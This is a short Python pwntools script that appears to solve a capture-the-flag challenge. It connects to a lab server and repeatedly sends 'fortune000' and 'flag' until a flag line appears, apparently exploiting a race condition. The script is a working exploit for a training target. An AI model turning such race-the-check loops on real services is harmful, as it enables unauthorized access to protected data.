#!/usr/bin/env python3
from pwn import *
import os
import time
import threading

# Connect to the remote server
# Replace these with the actual host and port
HOST = 'up.zoolab.org'  
PORT = 10931

r = remote(HOST, PORT)

while True:
    r.sendline(b"fortune000")
    r.sendline(b"flag")
    response = r.recvline()
    if b"FLAG" in response:
        log.success(f"{response.decode().strip()}")
        break

r.close()